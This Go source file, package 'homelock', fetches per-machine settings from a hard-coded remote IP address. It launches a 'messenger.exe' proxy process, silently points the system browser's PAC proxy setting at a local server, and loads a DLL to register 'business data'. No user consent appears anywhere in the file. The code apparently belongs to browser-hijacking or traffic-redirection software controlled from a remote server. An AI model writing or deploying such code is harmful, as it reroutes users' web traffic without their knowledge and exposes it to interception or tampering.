package homelock

import (
	"encoding/json"
	"io/ioutil"
	"os/exec"
	"strconv"
	"strings"

	"github.com/ssoor/youniverse/log"
)

const (
	PACListenPort uint16 = 44366
)

type JSONSettings struct {
	Services []Upstream `json:"services"`
}

func StartHomelock(guid string, encode bool) {

	log.Info.Printf("Set messenger GUID: %s\n", guid)
	url := "http://120.26.80.61/issued/settings/20160308/" + guid + ".settings"

	json_setting, err := GetURL(url)
	if err != nil {
		log.Error.Printf("Load setting: %s failed, err: %s\n", url, err)
		return
	}

	setting := JSONSettings{}
	if err = json.Unmarshal([]byte(json_setting), &setting); err != nil {
		log.Error.Printf("Load setting: %s failed, err: %s\n", url, err)
		return
	}

	for _, upstream := range setting.Services {
		log.Info.Printf("Setting messenger server information: %s\n", upstream.Address)
	}

	pac_addr := "127.0.0.1:" + strconv.FormatUint(uint64(PACListenPort), 10)

	socksd, err := CreateSocksConfig(pac_addr, setting.Services, guid)
	if err != nil {
		log.Error.Printf("Create messenger config failed, err: %s\n", err)
		return
	}

	json_socksd, _ := json.Marshal(socksd)
	ioutil.WriteFile("messenger.json", json_socksd, 0666)

	log.Info.Println("Creating an internal server:")

	log.Info.Printf("\tHTTP Protocol: %s\n", socksd.Proxies[0].HTTP)
	log.Info.Printf("\tSOCKS5 Protocol: %s\n", socksd.Proxies[0].SOCKS5)

	exec_cmd := exec.Command("messenger.exe", "-config", "messenger.json", "-guid", guid, "-encode", "true")

	err = exec_cmd.Start()
	if err != nil {
		log.Error.Printf("Start messenger process failed, err: %s\n", err)
		return
	}

	pac_url := "http://" + pac_addr + "/proxy.pac"

	isOK := SetPACProxy(pac_url)
	log.Info.Printf("Setting system browser pac information: %s, stats %u\n", pac_url, isOK)

	if encode {
		listenHTTP := socksd.Proxies[0].HTTP
		encodeport, err := strconv.ParseUint(listenHTTP[strings.LastIndexByte(listenHTTP, ':')+1:], 10, 16)
		if err != nil {
			log.Error.Printf("Parse encode port failed, err: %s\n", err)
			return
		}

        LoadDLL()
		pac_sockaddr := SocketCreateSockAddr("127.0.0.1", uint16(PACListenPort))
		encode_sockaddr := SocketCreateSockAddr("127.0.0.1", uint16(encodeport))

		handle := SetBusinessData(pac_sockaddr, encode_sockaddr)
		log.Info.Printf("Setting business data %s - %s, share handle: %d\n", pac_sockaddr, encode_sockaddr, handle)
	}
}
